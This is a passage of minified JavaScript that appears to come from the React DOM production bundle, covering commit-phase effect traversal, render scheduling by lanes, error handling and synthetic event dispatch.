Mc(e,t){e=null,t.alternate!==null&&(e=t.alternate.memoizedState.cache),t=t.memoizedState.cache,t!==e&&(t.refCount++,e!=null&&Za(e))}function Mt(e,t,l,a){if(t.subtreeFlags&10256)for(t=t.child;t!==null;)hr(e,t,l,a),t=t.sibling}function hr(e,t,l,a){var n=t.flags;switch(t.tag){case 0:case 11:case 15:Mt(e,t,l,a),n&2048&&un(9,t);break;case 1:Mt(e,t,l,a);break;case 3:Mt(e,t,l,a),n&2048&&(e=null,t.alternate!==null&&(e=t.alternate.memoizedState.cache),t=t.memoizedState.cache,t!==e&&(t.refCount++,e!=null&&Za(e)));break;case 12:if(n&2048){Mt(e,t,l,a),e=t.stateNode;try{var i=t.memoizedProps,u=i.id,s=i.onPostCommit;typeof s=="function"&&s(u,t.alternate===null?"mount":"update",e.passiveEffectDuration,-0)}catch(o){pe(t,t.return,o)}}else Mt(e,t,l,a);break;case 31:Mt(e,t,l,a);break;case 13:Mt(e,t,l,a);break;case 23:break;case 22:i=t.stateNode,u=t.alternate,t.memoizedState!==null?i._visibility&2?Mt(e,t,l,a):sn(e,t):i._visibility&2?Mt(e,t,l,a):(i._visibility|=2,ga(e,t,l,a,(t.subtreeFlags&10256)!==0||!1)),n&2048&&_c(u,t);break;case 24:Mt(e,t,l,a),n&2048&&Mc(t.alternate,t);break;default:Mt(e,t,l,a)}}function ga(e,t,l,a,n){for(n=n&&((t.subtreeFlags&10256)!==0||!1),t=t.child;t!==null;){var i=e,u=t,s=l,o=a,y=u.flags;switch(u.tag){case 0:case 11:case 15:ga(i,u,s,o,n),un(8,u);break;case 23:break;case 22:var S=u.stateNode;u.memoizedState!==null?S._visibility&2?ga(i,u,s,o,n):sn(i,u):(S._visibility|=2,ga(i,u,s,o,n)),n&&y&2048&&_c(u.alternate,u);break;case 24:ga(i,u,s,o,n),n&&y&2048&&Mc(u.alternate,u);break;default:ga(i,u,s,o,n)}t=t.sibling}}function sn(e,t){if(t.subtreeFlags&10256)for(t=t.child;t!==null;){var l=e,a=t,n=a.flags;switch(a.tag){case 22:sn(l,a),n&2048&&_c(a.alternate,a);break;case 24:sn(l,a),n&2048&&Mc(a.alternate,a);break;default:sn(l,a)}t=t.sibling}}var on=8192;function va(e,t,l){if(e.subtreeFlags&on)for(e=e.child;e!==null;)mr(e,t,l),e=e.sibling}function mr(e,t,l){switch(e.tag){case 26:va(e,t,l),e.flags&on&&e.memoizedState!==null&&iy(l,_t,e.memoizedState,e.memoizedProps);break;case 5:va(e,t,l);break;case 3:case 4:var a=_t;_t=Di(e.stateNode.containerInfo),va(e,t,l),_t=a;break;case 22:e.memoizedState===null&&(a=e.alternate,a!==null&&a.memoizedState!==null?(a=on,on=16777216,va(e,t,l),on=a):va(e,t,l));break;default:va(e,t,l)}}function yr(e){var t=e.alternate;if(t!==null&&(e=t.child,e!==null)){t.child=null;do t=e.sibling,e.sibling=null,e=t;while(e!==null)}}function fn(e){var t=e.deletions;if((e.flags&16)!==0){if(t!==null)for(var l=0;l<t.length;l++){var a=t[l];qe=a,gr(a,e)}yr(e)}if(e.subtreeFlags&10256)for(e=e.child;e!==null;)pr(e),e=e.sibling}function pr(e){switch(e.tag){case 0:case 11:case 15:fn(e),e.flags&2048&&dl(9,e,e.return);break;case 3:fn(e);break;case 12:fn(e);break;case 22:var t=e.stateNode;e.memoizedState!==null&&t._visibility&2&&(e.return===null||e.return.tag!==13)?(t._visibility&=-3,Si(e)):fn(e);break;default:fn(e)}}function Si(e){var t=e.deletions;if((e.flags&16)!==0){if(t!==null)for(var l=0;l<t.length;l++){var a=t[l];qe=a,gr(a,e)}yr(e)}for(e=e.child;e!==null;){switch(t=e,t.tag){case 0:case 11:case 15:dl(8,t,t.return),Si(t);break;case 22:l=t.stateNode,l._visibility&2&&(l._visibility&=-3,Si(t));break;default:Si(t)}e=e.sibling}}function gr(e,t){for(;qe!==null;){var l=qe;switch(l.tag){case 0:case 11:case 15:dl(8,l,t);break;case 23:case 22:if(l.memoizedState!==null&&l.memoizedState.cachePool!==null){var a=l.memoizedState.cachePool.pool;a!=null&&a.refCount++}break;case 24:Za(l.memoizedState.cache)}if(a=l.child,a!==null)a.return=l,qe=a;else e:for(l=e;qe!==null;){a=qe;var n=a.sibling,i=a.return;if(cr(a),a===l){qe=null;break e}if(n!==null){n.return=i,qe=n;break e}qe=i}}}var bm={getCacheForType:function(e){var t=Ze(He),l=t.data.get(e);return l===void 0&&(l=e(),t.data.set(e,l)),l},cacheSignal:function(){return Ze(He).controller.signal}},xm=typeof WeakMap=="function"?WeakMap:Map,re=0,xe=null,te=null,ie=0,ye=0,yt=null,hl=!1,Sa=!1,Dc=!1,$t=0,Oe=0,ml=0,Ql=0,Hc=0,pt=0,ba=0,rn=null,it=null,wc=!1,bi=0,vr=0,xi=1/0,Ti=null,yl=null,Be=0,pl=null,xa=null,It=0,Uc=0,Rc=null,Sr=null,dn=0,kc=null;function gt(){return(re&2)!==0&&ie!==0?ie&-ie:g.T!==null?Xc():Hs()}function br(){if(pt===0)if((ie&536870912)===0||se){var e=_n;_n<<=1,(_n&3932160)===0&&(_n=262144),pt=e}else pt=536870912;return e=ht.current,e!==null&&(e.flags|=32),pt}function ut(e,t,l){(e===xe&&(ye===2||ye===9)||e.cancelPendingCommit!==null)&&(Ta(e,0),gl(e,ie,pt,!1)),Da(e,l),((re&2)===0||e!==xe)&&(e===xe&&((re&2)===0&&(Ql|=l),Oe===4&&gl(e,ie,pt,!1)),Ut(e))}function xr(e,t,l){if((re&6)!==0)throw Error(h(327));var a=!l&&(t&127)===0&&(t&e.expiredLanes)===0||Ma(e,t),n=a?Nm(e,t):Lc(e,t,!0),i=a;do{if(n===0){Sa&&!a&&gl(e,t,0,!1);break}else{if(l=e.current.alternate,i&&!Tm(l)){n=Lc(e,t,!1),i=!1;continue}if(n===2){if(i=t,e.errorRecoveryDisabledLanes&i)var u=0;else u=e.pendingLanes&-536870913,u=u!==0?u:u&536870912?536870912:0;if(u!==0){t=u;e:{var s=e;n=rn;var o=s.current.memoizedState.isDehydrated;if(o&&(Ta(s,u).flags|=256),u=Lc(s,u,!1),u!==2){if(Dc&&!o){s.errorRecoveryDisabledLanes|=i,Ql|=i,n=4;break e}i=it,it=n,i!==null&&(it===null?it=i:it.push.apply(it,i))}n=u}if(i=!1,n!==2)continue}}if(n===1){Ta(e,0),gl(e,t,0,!0);break}e:{switch(a=e,i=n,i){case 0:case 1:throw Error(h(345));case 4:if((t&4194048)!==t)break;case 6:gl(a,t,pt,!hl);break e;case 2:it=null;break;case 3:case 5:break;default:throw Error(h(329))}if((t&62914560)===t&&(n=bi+300-st(),10<n)){if(gl(a,t,pt,!hl),Dn(a,0,!0)!==0)break e;It=t,a.timeoutHandle=Ir(Tr.bind(null,a,l,it,Ti,wc,t,pt,Ql,ba,hl,i,"Throttled",-0,0),n);break e}Tr(a,l,it,Ti,wc,t,pt,Ql,ba,hl,i,null,-0,0)}}break}while(!0);Ut(e)}function Tr(e,t,l,a,n,i,u,s,o,y,S,T,p,v){if(e.timeoutHandle=-1,T=t.subtreeFlags,T&8192||(T&16785408)===16785408){T={stylesheets:null,count:0,imgCount:0,imgBytes:0,suspenseyImages:[],waitingForImages:!0,waitingForViewTransition:!1,unsuspend:kt},mr(t,i,T);var M=(i&62914560)===i?bi-st():(i&4194048)===i?vr-st():0;if(M=uy(T,M),M!==null){It=i,e.cancelPendingCommit=M(_r.bind(null,e,t,i,l,a,n,u,s,o,S,T,null,p,v)),gl(e,i,u,!y);return}}_r(e,t,i,l,a,n,u,s,o)}function Tm(e){for(var t=e;;){var l=t.tag;if((l===0||l===11||l===15)&&t.flags&16384&&(l=t.updateQueue,l!==null&&(l=l.stores,l!==null)))for(var a=0;a<l.length;a++){var n=l[a],i=n.getSnapshot;n=n.value;try{if(!rt(i(),n))return!1}catch{return!1}}if(l=t.child,t.subtreeFlags&16384&&l!==null)l.return=t,t=l;else{if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function gl(e,t,l,a){t&=~Hc,t&=~Ql,e.suspendedLanes|=t,e.pingedLanes&=~t,a&&(e.warmLanes|=t),a=e.expirationTimes;for(var n=t;0<n;){var i=31-ft(n),u=1<<i;a[i]=-1,n&=~u}l!==0&&_s(e,l,t)}function Ai(){return(re&6)===0?(hn(0),!1):!0}function Bc(){if(te!==null){if(ye===0)var e=te.return;else e=te,qt=Ul=null,ec(e),da=null,Ja=0,e=te;for(;e!==null;)Pf(e.alternate,e),e=e.return;te=null}}function Ta(e,t){var l=e.timeoutHandle;l!==-1&&(e.timeoutHandle=-1,Gm(l)),l=e.cancelPendingCommit,l!==null&&(e.cancelPendingCommit=null,l()),It=0,Bc(),xe=e,te=l=Lt(e.current,null),ie=t,ye=0,yt=null,hl=!1,Sa=Ma(e,t),Dc=!1,ba=pt=Hc=Ql=ml=Oe=0,it=rn=null,wc=!1,(t&8)!==0&&(t|=t&32);var a=e.entangledLanes;if(a!==0)for(e=e.entanglements,a&=t;0<a;){var n=31-ft(a),i=1<<n;t|=e[n],a&=~i}return $t=t,Qn(),l}function Ar(e,t){P=null,g.H=ln,t===ra||t===In?(t=Bo(),ye=3):t===Gu?(t=Bo(),ye=4):ye=t===pc?8:t!==null&&typeof t=="object"&&typeof t.then=="function"?6:1,yt=t,te===null&&(Oe=1,di(e,xt(t,e.current)))}function Nr(){var e=ht.current;return e===null?!0:(ie&4194048)===ie?jt===null:(ie&62914560)===ie||(ie&536870912)!==0?e===jt:!1}function jr(){var e=g.H;return g.H=ln,e===null?ln:e}function Er(){var e=g.A;return g.A=bm,e}function Ni(){Oe=4,hl||(ie&4194048)!==ie&&ht.current!==null||(Sa=!0),(ml&134217727)===0&&(Ql&134217727)===0||xe===null||gl(xe,ie,pt,!1)}function Lc(e,t,l){var a=re;re|=2;var n=jr(),i=Er();(xe!==e||ie!==t)&&(Ti=null,Ta(e,t)),t=!1;var u=Oe;e:do try{if(ye!==0&&te!==null){var s=te,o=yt;switch(ye){case 8:Bc(),u=6;break e;case 3:case 2:case 9:case 6:ht.current===null&&(t=!0);var y=ye;if(ye=0,yt=null,Aa(e,s,o,y),l&&Sa){u=0;break e}break;default:y=ye,ye=0,yt=null,Aa(e,s,o,y)}}Am(),u=Oe;break}catch(S){Ar(e,S)}while(!0);return t&&e.shellSuspendCounter++,qt=Ul=null,re=a,g.H=n,g.A=i,te===null&&(xe=null,ie=0,Qn()),u}function Am(){for(;te!==null;)zr(te)}function Nm(e,t){var l=re;re|=2;var a=jr(),n=Er();xe!==e||ie!==t?(Ti=null,xi=st()+500,Ta(e,t)):Sa=Ma(e,t);e:do try{if(ye!==0&&te!==null){t=te;var i=yt;t:switch(ye){case 1:ye=0,yt=null,Aa(e,t,i,1);break;case 2:case 9:if(Ro(i)){ye=0,yt=null,Cr(t);break}t=function(){ye!==2&&ye!==9||xe!==e||(ye=7),Ut(e)},i.then(t,t);break e;case 3:ye=7;break e;case 4:ye=5;break e;case 7:Ro(i)?(ye=0,yt=null,Cr(t)):(ye=0,yt=null,Aa(e,t,i,7));break;case 5:var u=null;switch(te.tag){case 26:u=te.memoizedState;case 5:case 27:var s=te;if(u?hd(u):s.stateNode.complete){ye=0,yt=null;var o=s.sibling;if(o!==null)te=o;else{var y=s.return;y!==null?(te=y,ji(y)):te=null}break t}}ye=0,yt=null,Aa(e,t,i,5);break;case 6:ye=0,yt=null,Aa(e,t,i,6);break;case 8:Bc(),Oe=6;break e;default:throw Error(h(462))}}jm();break}catch(S){Ar(e,S)}while(!0);return qt=Ul=null,g.H=a,g.A=n,re=l,te!==null?0:(xe=null,ie=0,Qn(),Oe)}function jm(){for(;te!==null&&!Jd();)zr(te)}function zr(e){var t=$f(e.alternate,e,$t);e.memoizedProps=e.pendingProps,t===null?ji(e):te=t}function Cr(e){var t=e,l=t.alternate;switch(t.tag){case 15:case 0:t=Vf(l,t,t.pendingProps,t.type,void 0,ie);break;case 11:t=Vf(l,t,t.pendingProps,t.type.render,t.ref,ie);break;case 5:ec(t);default:Pf(l,t),t=te=jo(t,$t),t=$f(l,t,$t)}e.memoizedProps=e.pendingProps,t===null?ji(e):te=t}function Aa(e,t,l,a){qt=Ul=null,ec(t),da=null,Ja=0;var n=t.return;try{if(hm(e,n,t,l,ie)){Oe=1,di(e,xt(l,e.current)),te=null;return}}catch(i){if(n!==null)throw te=n,i;Oe=1,di(e,xt(l,e.current)),te=null;return}t.flags&32768?(se||a===1?e=!0:Sa||(ie&536870912)!==0?e=!1:(hl=e=!0,(a===2||a===9||a===3||a===6)&&(a=ht.current,a!==null&&a.tag===13&&(a.flags|=16384))),Or(t,e)):ji(t)}function ji(e){var t=e;do{if((t.flags&32768)!==0){Or(t,hl);return}e=t.return;var l=pm(t.alternate,t,$t);if(l!==null){te=l;return}if(t=t.sibling,t!==null){te=t;return}te=t=e}while(t!==null);Oe===0&&(Oe=5)}function Or(e,t){do{var l=gm(e.alternate,e);if(l!==null){l.flags&=32767,te=l;return}if(l=e.return,l!==null&&(l.flags|=32768,l.subtreeFlags=0,l.deletions=null),!t&&(e=e.sibling,e!==null)){te=e;return}te=e=l}while(e!==null);Oe=6,te=null}function _r(e,t,l,a,n,i,u,s,o){e.cancelPendingCommit=null;do Ei();while(Be!==0);if((re&6)!==0)throw Error(h(327));if(t!==null){if(t===e.current)throw Error(h(177));if(i=t.lanes|t.childLanes,i|=zu,nh(e,l,i,u,s,o),e===xe&&(te=xe=null,ie=0),xa=t,pl=e,It=l,Uc=i,Rc=n,Sr=a,(t.subtreeFlags&10256)!==0||(t.flags&10256)!==0?(e.callbackNode=null,e.callbackPriority=0,Om(Cn,function(){return Ur(),null})):(e.callbackNode=null,e.callbackPriority=0),a=(t.flags&13878)!==0,(t.subtreeFlags&13878)!==0||a){a=g.T,g.T=null,n=E.p,E.p=2,u=re,re|=4;try{vm(e,t,l)}finally{re=u,E.p=n,g.T=a}}Be=1,Mr(),Dr(),Hr()}}function Mr(){if(Be===1){Be=0;var e=pl,t=xa,l=(t.flags&13878)!==0;if((t.subtreeFlags&13878)!==0||l){l=g.T,g.T=null;var a=E.p;E.p=2;var n=re;re|=4;try{rr(t,e);var i=$c,u=po(e.containerInfo),s=i.focusedElem,o=i.selectionRange;if(u!==s&&s&&s.ownerDocument&&yo(s.ownerDocument.documentElement,s)){if(o!==null&&Tu(s)){var y=o.start,S=o.end;if(S===void 0&&(S=y),"selectionStart"in s)s.selectionStart=y,s.selectionEnd=Math.min(S,s.value.length);else{var T=s.ownerDocument||document,p=T&&T.defaultView||window;if(p.getSelection){var v=p.getSelection(),M=s.textContent.length,V=Math.min(o.start,M),be=o.end===void 0?V:Math.min(o.end,M);!v.extend&&V>be&&(u=be,be=V,V=u);var d=mo(s,V),f=mo(s,be);if(d&&f&&(v.rangeCount!==1||v.anchorNode!==d.node||v.anchorOffset!==d.offset||v.focusNode!==f.node||v.focusOffset!==f.offset)){var m=T.createRange();m.setStart(d.node,d.offset),v.removeAllRanges(),V>be?(v.addRange(m),v.extend(f.node,f.offset)):(m.setEnd(f.node,f.offset),v.addRange(m))}}}}for(T=[],v=s;v=v.parentNode;)v.nodeType===1&&T.push({element:v,left:v.scrollLeft,top:v.scrollTop});for(typeof s.focus=="function"&&s.focus(),s=0;s<T.length;s++){var b=T[s];b.element.scrollLeft=b.left,b.element.scrollTop=b.top}}Bi=!!Fc,$c=Fc=null}finally{re=n,E.p=a,g.T=l}}e.current=t,Be=2}}function Dr(){if(Be===2){Be=0;var e=pl,t=xa,l=(t.flags&8772)!==0;if((t.subtreeFlags&8772)!==0||l){l=g.T,g.T=null;var a=E.p;E.p=2;var n=re;re|=4;try{ur(e,t.alternate,t)}finally{re=n,E.p=a,g.T=l}}Be=3}}function Hr(){if(Be===4||Be===3){Be=0,Wd();var e=pl,t=xa,l=It,a=Sr;(t.subtreeFlags&10256)!==0||(t.flags&10256)!==0?Be=5:(Be=0,xa=pl=null,wr(e,e.pendingLanes));var n=e.pendingLanes;if(n===0&&(yl=null),au(l),t=t.stateNode,ot&&typeof ot.onCommitFiberRoot=="function")try{ot.onCommitFiberRoot(_a,t,void 0,(t.current.flags&128)===128)}catch{}if(a!==null){t=g.T,n=E.p,E.p=2,g.T=null;try{for(var i=e.onRecoverableError,u=0;u<a.length;u++){var s=a[u];i(s.value,{componentStack:s.stack})}}finally{g.T=t,E.p=n}}(It&3)!==0&&Ei(),Ut(e),n=e.pendingLanes,(l&261930)!==0&&(n&42)!==0?e===kc?dn++:(dn=0,kc=e):dn=0,hn(0)}}function wr(e,t){(e.pooledCacheLanes&=t)===0&&(t=e.pooledCache,t!=null&&(e.pooledCache=null,Za(t)))}function Ei(){return Mr(),Dr(),Hr(),Ur()}function Ur(){if(Be!==5)return!1;var e=pl,t=Uc;Uc=0;var l=au(It),a=g.T,n=E.p;try{E.p=32>l?32:l,g.T=null,l=Rc,Rc=null;var i=pl,u=It;if(Be=0,xa=pl=null,It=0,(re&6)!==0)throw Error(h(331));var s=re;if(re|=4,pr(i.current),hr(i,i.current,u,l),re=s,hn(0,!1),ot&&typeof ot.onPostCommitFiberRoot=="function")try{ot.onPostCommitFiberRoot(_a,i)}catch{}return!0}finally{E.p=n,g.T=a,wr(e,t)}}function Rr(e,t,l){t=xt(l,t),t=yc(e.stateNode,t,2),e=ol(e,t,2),e!==null&&(Da(e,2),Ut(e))}function pe(e,t,l){if(e.tag===3)Rr(e,e,l);else for(;t!==null;){if(t.tag===3){Rr(t,e,l);break}else if(t.tag===1){var a=t.stateNode;if(typeof t.type.getDerivedStateFromError=="function"||typeof a.componentDidCatch=="function"&&(yl===null||!yl.has(a))){e=xt(l,e),l=kf(2),a=ol(t,l,2),a!==null&&(Bf(l,a,t,e),Da(a,2),Ut(a));break}}t=t.return}}function Yc(e,t,l){var a=e.pingCache;if(a===null){a=e.pingCache=new xm;var n=new Set;a.set(t,n)}else n=a.get(t),n===void 0&&(n=new Set,a.set(t,n));n.has(l)||(Dc=!0,n.add(l),e=Em.bind(null,e,t,l),t.then(e,e))}function Em(e,t,l){var a=e.pingCache;a!==null&&a.delete(t),e.pingedLanes|=e.suspendedLanes&l,e.warmLanes&=~l,xe===e&&(ie&l)===l&&(Oe===4||Oe===3&&(ie&62914560)===ie&&300>st()-bi?(re&2)===0&&Ta(e,0):Hc|=l,ba===ie&&(ba=0)),Ut(e)}function kr(e,t){t===0&&(t=Os()),e=Dl(e,t),e!==null&&(Da(e,t),Ut(e))}function zm(e){var t=e.memoizedState,l=0;t!==null&&(l=t.retryLane),kr(e,l)}function Cm(e,t){var l=0;switch(e.tag){case 31:case 13:var a=e.stateNode,n=e.memoizedState;n!==null&&(l=n.retryLane);break;case 19:a=e.stateNode;break;case 22:a=e.stateNode._retryCache;break;default:throw Error(h(314))}a!==null&&a.delete(t),kr(e,l)}function Om(e,t){return Pi(e,t)}var zi=null,Na=null,qc=!1,Ci=!1,Gc=!1,vl=0;function Ut(e){e!==Na&&e.next===null&&(Na===null?zi=Na=e:Na=Na.next=e),Ci=!0,qc||(qc=!0,Mm())}function hn(e,t){if(!Gc&&Ci){Gc=!0;do for(var l=!1,a=zi;a!==null;){if(e!==0){var n=a.pendingLanes;if(n===0)var i=0;else{var u=a.suspendedLanes,s=a.pingedLanes;i=(1<<31-ft(42|e)+1)-1,i&=n&~(u&~s),i=i&201326741?i&201326741|1:i?i|2:0}i!==0&&(l=!0,qr(a,i))}else i=ie,i=Dn(a,a===xe?i:0,a.cancelPendingCommit!==null||a.timeoutHandle!==-1),(i&3)===0||Ma(a,i)||(l=!0,qr(a,i));a=a.next}while(l);Gc=!1}}function _m(){Br()}function Br(){Ci=qc=!1;var e=0;vl!==0&&qm()&&(e=vl);for(var t=st(),l=null,a=zi;a!==null;){var n=a.next,i=Lr(a,t);i===0?(a.next=null,l===null?zi=n:l.next=n,n===null&&(Na=l)):(l=a,(e!==0||(i&3)!==0)&&(Ci=!0)),a=n}Be!==0&&Be!==5||hn(e),vl!==0&&(vl=0)}function Lr(e,t){for(var l=e.suspendedLanes,a=e.pingedLanes,n=e.expirationTimes,i=e.pendingLanes&-62914561;0<i;){var u=31-ft(i),s=1<<u,o=n[u];o===-1?((s&l)===0||(s&a)!==0)&&(n[u]=ah(s,t)):o<=t&&(e.expiredLanes|=s),i&=~s}if(t=xe,l=ie,l=Dn(e,e===t?l:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),a=e.callbackNode,l===0||e===t&&(ye===2||ye===9)||e.cancelPendingCommit!==null)return a!==null&&a!==null&&eu(a),e.callbackNode=null,e.callbackPriority=0;if((l&3)===0||Ma(e,l)){if(t=l&-l,t===e.callbackPriority)return t;switch(a!==null&&eu(a),au(l)){case 2:case 8:l=zs;break;case 32:l=Cn;break;case 268435456:l=Cs;break;default:l=Cn}return a=Yr.bind(null,e),l=Pi(l,a),e.callbackPriority=t,e.callbackNode=l,t}return a!==null&&a!==null&&eu(a),e.callbackPriority=2,e.callbackNode=null,2}function Yr(e,t){if(Be!==0&&Be!==5)return e.callbackNode=null,e.callbackPriority=0,null;var l=e.callbackNode;if(Ei()&&e.callbackNode!==l)return null;var a=ie;return a=Dn(e,e===xe?a:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),a===0?null:(xr(e,a,t),Lr(e,st()),e.callbackNode!=null&&e.callbackNode===l?Yr.bind(null,e):null)}function qr(e,t){if(Ei())return null;xr(e,t,!0)}function Mm(){Xm(function(){(re&6)!==0?Pi(Es,_m):Br()})}function Xc(){if(vl===0){var e=oa;e===0&&(e=On,On<<=1,(On&261888)===0&&(On=256)),vl=e}return vl}function Gr(e){return e==null||typeof e=="symbol"||typeof e=="boolean"?null:typeof e=="function"?e:Rn(""+e)}function Xr(e,t){var l=t.ownerDocument.createElement("input");return l.name=t.name,l.value=t.value,e.id&&l.setAttribute("form",e.id),t.parentNode.insertBefore(l,t),e=new FormData(e),l.parentNode.removeChild(l),e}function Dm(e,t,l,a,n){if(t==="submit"&&l&&l.stateNode===n){var i=Gr((n[et]||null).action),u=a.submitter;u&&(t=(t=u[et]||null)?Gr(t.formAction):u.getAttribute("formAction"),t!==null&&(i=t,u=null));var s=new Yn("action","action",null,a,n);e.push({event:s,listeners:[{instance:null,listener:function(){if(a.defaultPrevented){if(vl!==0){var o=u?Xr(n,u):new FormData(n);oc(l,{pending:!0,data:o,method:n.method,action:i},null,o)}}else typeof i=="function"&&(s.preventDefault(),o=u?Xr(n,u):new FormData(n),oc(l,{pending:!0,data:o,method:n.method,action:i},i,o))},currentTarget:n}]})}}for(var Qc=0;Qc<Eu.length;Qc++){var Vc=Eu[Qc],Hm=Vc.toLowerCase(),wm=Vc[0].toUpperCase()+Vc.slice(1);Ot(Hm,"on"+wm)}Ot(So,"onAnimationEnd"),Ot(bo,"onAnimationIteration"),Ot(xo,"onAnimationStart"),Ot("dblclick","onDoubleClick"),Ot("focusin","onFocus"),Ot("focusout","onBlur"),Ot(Fh,"onTransitionRun"),Ot($h,"onTransitionStart"),Ot(Ih,"onTransitionCancel"),Ot(To,"onTransitionEnd"),Wl("onMouseEnter",["mouseout","mouseover"]),Wl("onMouseLeave",["mouseout","mouseover"]),Wl("onPointerEnter",["pointerout","pointerover"]),Wl("onPointerLeave",["pointerout","pointerover"]),Cl("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),Cl("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),Cl("onBeforeInput",["compositionend","keypress","textInput","paste"]),Cl("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),Cl("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),Cl("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var mn="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Um=new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(mn));function Qr(e,t){t=(t&4)!==0;for(var l=0;l<e.length;l++){var a=e[l],n=a.event;a=a.listeners;e:{var i=void 0;if(t)for(var u=a.length-1;0<=u;u--){var s=a[u],o=s.instance,y=s.currentTarget;if(s=s.listener,o!==i&&n.isPropagationStopped())break e;i=s,n.currentTarget=y;try{i(n)}catch(S){Xn(S)}n.currentTarget=null,i=o}else for(u=0;u<a.length;u++){if(s=a[u],o=s.instance,y=s.currentTarget,s=s.listener,o!==i&&n.isPropagationStopped())break e;i=s,n.currentTarget=y;try{i(n)}catch(S){Xn(S)}n.currentTarget=null,i=o}}}}function le(e,t){var l=t[nu];l===void 0&&(l=t[nu]=new Set);var a=e+"__bubble";l.has(a)||(Vr(t,e,2,!1),l.add(a))}function Zc(e,t,l){var a=0;t&&(a|=4),Vr(l,e,a,t)}var Oi="_reactListening"+Math.random().toString(36).slice(2);function Kc(e){if(!e[Oi]){e[Oi]=!0,Rs.forEach(function(l){l!=="selectionchange"&&(Um.has(l)||Zc(l,!1,e),Zc(l,!0,e))});var t=e.nodeType===9?e:e.ownerDocument;t===null||t[Oi]||(t[Oi]=!0,Zc("selectionchange",!1,t))}}function Vr(e,t,l,a){switch(bd(t)){case 2:var n=oy;break;case 8:n=fy;break;default:n=ss}l=n.bind(null,t,l,e),n=void 0,!hu||t!=="touchstart"&&t!=="touchmove"&&t!=="wheel"||(n=!0),a?n!==void 0?e.addEventListener(t,l,{capture:!0,passive:n}):e.addEventListener(t,l,!0):n!==void 0?e.addEventListener(t,l,{passive:n}):e.addEventListener(t,l,!1)}function Jc(e,t,l,a,n){var i=a;if((t&1)===0&&(t&2)===0&&a!==null)e:for(;;){if(a===null)return;var u=a.tag;if(u===3||u===4){var s=a.stateNode.containerInfo;if(s===n)break;if(u===4)for(u=a.return;u!==null;){var o=u.tag;if((o===3||o===4)&&u.stateNode.containerInfo===n)return;u=u.return}for(;s!==null;){if(u=Zl(s),u===null)return;if(o=u.tag,o===5||o===6||o===26||o===27){a=i=u;continue e}s=s.parentNode}}a=a.return}Js(function(){var y=i,S=ru(l),T=[];e:{var p=Ao.get(e);if(p!==void 0){var v=Yn,M=e;switch(e){case"keypress":if(Bn(l)===0)break e;case"keydown":case"keyup":v=Ch;break;case"focusin":M="focus",v=gu;break;case"focusout":M="blur",v=gu;break;case"beforeblur":case"afterblur":v=gu;break;case"click":if(l.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":v=$s;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":v=ph;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":v=Mh;break;case So:case bo:case xo:v=Sh;break;case To:v=Hh;break;case"scroll":case"scrollend":v=mh;break;case"wheel":v=Uh;break;case"copy":case"cut":case"paste":v=xh;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":v=Ps;break;case"toggle":case"beforetoggle":v=kh}var V=(t&4)!==0,be=!V&&(e==="scroll"||e==="scrollend"),d=V?p!==null?p+"Capture":null:p;V=[];for(var f=y,m;f!==null;){var b=f;if(m=b.stateNode,b=b.tag,b!==5&&b!==26&&b!==27||m===null||d===null||(b=Ua(f,d),b!=null&&V.push(yn(f,b,m))),be)break;f=f.return}0<V.length&&(p=new v(p,M,null,l,S),T.push({event:p,listeners:V}))}}if((t&7)===0){e:{if(p=e==="mouseover"||e==="pointerover",v=e==="mouseout"||e==="pointerout",p&&l!==fu&&(M=l.relatedTarget||l.fromElement)&&(Zl(M)||M[Vl]))break e;if((v||p)&&(p=S.window===S?S:(p=S.ownerDocument)?p.defaultView||p.parentWindow:window,v?(M=l.relatedTarget||l.toElement,v=y,M=M?Zl(M):null,M!==null&&(be=J(M),V=M.tag,M!==be||V!==5&&V!==27&&V!==6)&&(M=null)):(v=null,M=y),v!==M)){if(V=$s,b="onMouseLeave",d="onMouseEnter",f="mouse",(e==="pointerout"||e==="pointerover")&&(V=Ps,b="onPointerLeave",d="onPointerEnter",f="pointer"),be=v==null?p:wa(v),m=M==null?p:wa(M),p=new V(b,f+"leave",v,l,S),p.target=be,p.relatedTarget=m,b=null,Zl(S)===y&&(V=new V(d,f+"enter",M,l,S),V.target=m,V.relatedTarget=be,b=V),be=b,v&&M)t:{for(V=Rm,d=v,f=M,m=0,b=d;b;b=V(b))m++;b=0;for(var G=f;G;G=V(G))b++;for(;0<m-b;)d=V(d),m--;for(;0<b-m;)f=V(f),b--;for(;m--;){if(d===f||f!==null&&d===f.alternate){V=d;break t}d=V(d),f=V(f)}V=null}else V=null;v!==null&&Zr(T,p,v,V,!1),M!==null&&be!==null&&Zr(T,be,M,V,!0)}}e:{if(p=y?wa(y):window,v=p.nodeName&&p.nodeName.toLowerCase(),v==="select"||v==="input"&&p.type==="file")var oe=co;else if(io(p))if(so)oe=Kh;else{oe=Vh;var R=Qh}else v=p.nodeName,!v||v.toLowerCase()!=="input"||p.type!=="checkbox"&&p.type!=="radio"?y&&ou(y.elementType)&&(oe=co):oe=Zh;if(oe&&(oe=oe(e,y))){uo(T,oe,l,S);break 